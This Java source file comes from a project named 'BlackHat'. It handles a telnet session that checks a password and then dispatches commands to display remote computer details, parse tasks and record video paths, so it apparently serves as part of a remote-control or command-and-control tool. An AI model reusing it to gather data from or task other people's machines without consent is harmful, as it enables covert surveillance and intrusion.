/*
 * GNU Library or Lesser Public License (LGPL)
 */
package Connection;

import Window.MainGUI;
import java.io.IOException;

/**
 * @author Geoffrey
 */
public class Telnet {
    
    public static final int NONE = -1;
    public static final int CLIENT = 0;
    public static final int SERVER_LISTENING = 10;
    public static final int SERVER_CONNECTED = 11;
    public static final int PIPELINE_LISTENING = 20;
    public static final int PIPELINE_CONNECTED = 21;
    private MainGUI Class;
    private TelnetSession telnetSession = null;
    
    public void createClient(String clientHost, int clientPort, MainGUI Class) {
        try {
            
            telnetSession = new TelnetClient(this, clientHost, clientPort);
            this.Class = Class;
        } catch (IOException exception) {
        }
    }
    
    public void setSessionState(int sessionState) {
        System.out.println(sessionState);
    }
    
    public void appendStatusMessage(String message) {
        if (blackhat.BlackHat.Debug) {
            System.out.println(message);
        }
    }
    
    public void appendData(String data) {
        TasksWorks TW = new TasksWorks();
        String[] DataArray = data.split(":");
        if (DataArray.length > 0) {
            String Type = DataArray[0].getClass().getSimpleName();
            if (Type.equals("String")) {
                String PASSWORD = DataArray[2];
                String ADMINPASSWORD = blackhat.BlackHat.Args.get("PASSWORD");
                if (ADMINPASSWORD.equals(PASSWORD)) {
                    int Code = Integer.parseInt(DataArray[0]);
                    switch (Code) {
                        case Command.CLOSE_SESSION:
                            appendStatusMessage("BlackHat Close Session");
                            stopSession(telnetSession);
                            break;
                        case Command.INFORMATION:
                            String UUID = DataArray[1];
                            String PC_NAME = DataArray[3];
                            String LOGINTIME = DataArray[4];
                            String SYSTEMNAME = DataArray[5];
                            
                            this.Class.ShowComputerInformation(UUID, PC_NAME, LOGINTIME, SYSTEMNAME, DataArray);
                            break;
                        case Command.TASKS:
                            TW.parcing(data);
                            break;
                        case Command.DONE:
                            System.out.println("Reseved Done");
                            break;
                        case Command.FIAL:
                            System.out.println("Reseved Fial");
                            break;
                        case Command.VIDEO_PATH:
                            this.Class.InsertVideoPath(data);
                            sendCommand(Command.DONE);
                            break;
                    }
                    stopSession(telnetSession);
                } else {
                    stopSession(telnetSession);
                }
            } else {
                stopSession(telnetSession);
            }
        }
    }
    
    public void sendString(String sendString) {
        if (telnetSession != null) {
            telnetSession.sendData(sendString);
        }
    }
    
    public void sendCommand(int Command) {
        if (telnetSession != null) {
            telnetSession.sendData(Command);
        }
    }
    
    public boolean hasActiveSession() {
        return telnetSession != null;
    }
    
    public synchronized void stopSession(TelnetSession stopSession) {
        if (telnetSession != null) {
            if (stopSession == null || stopSession == telnetSession) {
                telnetSession.stopSession();
                telnetSession = null;
//                telnetPanel.setSessionState(Telnet.NONE);
            }
        }
    }
}
